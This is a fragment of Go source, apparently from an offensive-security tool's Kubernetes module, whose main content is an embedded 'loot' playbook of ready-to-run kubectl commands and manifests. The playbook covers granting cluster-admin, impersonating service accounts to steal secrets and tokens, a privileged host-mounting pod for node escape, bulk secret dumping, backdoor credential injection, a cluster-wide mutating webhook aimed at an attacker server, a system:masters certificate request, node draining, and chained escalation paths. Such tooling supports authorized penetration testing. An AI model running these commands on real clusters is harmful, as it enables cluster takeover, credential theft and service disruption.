	lootExploitsSection.Add(`
##############################################
## 1. RBAC Modification (Privilege Escalation)
##############################################
# If you can create/update Roles, ClusterRoles, RoleBindings, or ClusterRoleBindings:

# Grant yourself cluster-admin
kubectl create clusterrolebinding pwn --clusterrole=cluster-admin --user=<your-user>
kubectl create clusterrolebinding pwn --clusterrole=cluster-admin --serviceaccount=<namespace>:<serviceaccount>

# Create a custom high-privilege role
cat <<EOF | kubectl apply -f -
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: pwn-role
rules:
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["*"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: pwn-binding
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: pwn-role
subjects:
- kind: User
  name: <your-user>
  apiGroup: rbac.authorization.k8s.io
EOF

##############################################
## 2. Impersonation (Identity Theft)
##############################################
# If you can impersonate users, groups, or service accounts:

# Test impersonation
kubectl auth can-i --list --as=system:serviceaccount:kube-system:default
kubectl auth can-i --list --as=admin

# Impersonate cluster-admin or high-privilege user
kubectl --as=system:admin get secrets --all-namespaces
kubectl --as=system:serviceaccount:kube-system:default get secrets -n kube-system

# Extract service account tokens by impersonating
kubectl --as=system:serviceaccount:kube-system:admin create token admin -n kube-system --duration=24h

##############################################
## 3. Pod Creation (Container Escape)
##############################################
# If you can create pods:

# Create privileged pod for node escape
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: pwn-pod
  namespace: default
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: pwn
    image: alpine:latest
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
    command: ["/bin/sh"]
    args: ["-c", "sleep 3600"]
  volumes:
  - name: host
    hostPath:
      path: /
      type: Directory
EOF

# Execute into the pod
kubectl exec -it pwn-pod -- /bin/sh
# Inside pod, escape to host:
# chroot /host
# Or use nsenter:
# nsenter --target 1 --mount --uts --ipc --net --pid -- bash

##############################################
## 4. Secret Access (Credential Theft)
##############################################
# If you can read or modify secrets:

# Extract all secrets
kubectl get secrets --all-namespaces -o json | jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name): \(.data)"'

# Decode specific secret
kubectl get secret <secret-name> -n <namespace> -o jsonpath='{.data}' | jq -r 'to_entries[] | "\(.key)=\(.value | @base64d)"'

# Extract service account tokens
kubectl get secrets --all-namespaces -o json | jq -r '.items[] | select(.type=="kubernetes.io/service-account-token") | "\(.metadata.namespace)/\(.metadata.name)"'

# Modify secret to inject backdoor credentials
kubectl patch secret <secret-name> -n <namespace> -p '{"data":{"password":"YmFja2Rvb3I="}}'

##############################################
## 5. Pod Execution (Runtime Access)
##############################################
# If you can use pods/exec, pods/attach, or pods/portforward:

# Find pods to execute into
kubectl get pods --all-namespaces -o wide

# Execute into pod and steal secrets
kubectl exec -it <pod-name> -n <namespace> -- /bin/sh
# Inside pod:
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# Extract environment variables (may contain secrets)
kubectl exec <pod-name> -n <namespace> -- env

# Port forward to access internal services
kubectl port-forward <pod-name> -n <namespace> 8080:80

##############################################
## 6. Admission Webhook Control (CRITICAL)
##############################################
# If you can create/modify ValidatingWebhookConfiguration or MutatingWebhookConfiguration:

# Intercept ALL cluster API requests
# WARNING: This can break the cluster if misconfigured
cat <<EOF | kubectl apply -f -
apiVersion: admissionregistration.k8s.io/v1
kind: MutatingWebhookConfiguration
metadata:
  name: pwn-webhook
webhooks:
- name: pwn.example.com
  clientConfig:
    url: https://<your-webhook-server>/mutate
  rules:
  - operations: ["CREATE", "UPDATE"]
    apiGroups: ["*"]
    apiVersions: ["*"]
    resources: ["*"]
  admissionReviewVersions: ["v1"]
  sideEffects: None
EOF

# This webhook can:
# - Inject malicious containers into all pods
# - Modify secrets before creation
# - Bypass security policies
# - Capture sensitive data from all API requests

##############################################
## 7. Certificate Approval (Auth Bypass)
##############################################
# If you can create or approve CertificateSigningRequests:

# Create CSR for cluster-admin user
cat <<EOF | kubectl apply -f -
apiVersion: certificates.k8s.io/v1
kind: CertificateSigningRequest
metadata:
  name: pwn-csr
spec:
  request: <base64-encoded-csr>
  signerName: kubernetes.io/kube-apiserver-client
  usages:
  - client auth
  groups:
  - system:masters
EOF

# Approve the CSR
kubectl certificate approve pwn-csr

# Extract the certificate
kubectl get csr pwn-csr -o jsonpath='{.status.certificate}' | base64 -d > pwn.crt

##############################################
## 8. Node Modification (Cluster Disruption)
##############################################
# If you can modify nodes:

# Taint node to evict all pods
kubectl taint nodes <node-name> pwn=true:NoSchedule

# Drain node (evict all pods)
kubectl drain <node-name> --ignore-daemonsets --delete-emptydir-data

# Modify node labels to bypass scheduling constraints
kubectl label nodes <node-name> pwn=true

##############################################
## 9. Attack Path Chaining
##############################################
# Combine multiple permissions for maximum impact:

# Chain 1: Pod Creation → Host Escape → Node Compromise
# 1. Create privileged pod
# 2. Mount host filesystem
# 3. Chroot to host
# 4. Modify kubelet config or steal node credentials

# Chain 2: Secret Read → ServiceAccount Token → RBAC Escalation
# 1. Read service account secrets
# 2. Extract high-privilege SA token
# 3. Use token to create cluster-admin binding
# 4. Full cluster access

# Chain 3: Impersonate → Create Role → Bind to Self
# 1. Impersonate user with RBAC modification rights
# 2. Create cluster-admin role binding for yourself
# 3. Switch back to your identity with full access

# Chain 4: ConfigMap Modify → Pod Environment → Credential Injection
# 1. Modify ConfigMap used by pods
# 2. Inject malicious environment variables
# 3. Wait for pod restart or scale up
# 4. Pods execute with backdoor credentials

`)
	// Output section
	table := internal.TableFile{
		Name:   "Hidden-Admins",
		Header: headers,
		Body:   tableRows,
	}

	// Build all loot files
	lootFiles := loot.Build()

	err = internal.HandleOutput(
		"Kubernetes",
		format,
		outputDirectory,
		verbosity,
		wrap,
		"Hidden-Admins",
		globals.ClusterName,
		"results",
		HiddenAdminsOutput{
			Table: []internal.TableFile{table},
			Loot:  lootFiles,
		},
	)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error handling output: %v", err), globals.K8S_HIDDEN_ADMINS_MODULE_NAME)
		return
	}

	if len(tableRows) > 0 {
		logger.InfoM(fmt.Sprintf("%d hidden admin findings found", len(tableRows)), globals.K8S_HIDDEN_ADMINS_MODULE_NAME)
	} else {
		logger.InfoM("No hidden admin findings found, skipping output file creation", globals.K8S_HIDDEN_ADMINS_MODULE_NAME)
	}

	logger.InfoM(fmt.Sprintf("For context and next steps: https://github.com/BishopFox/cloudfox/wiki/Kubernetes-Commands#%s", globals.K8S_HIDDEN_ADMINS_MODULE_NAME), globals.K8S_HIDDEN_ADMINS_MODULE_NAME)
}
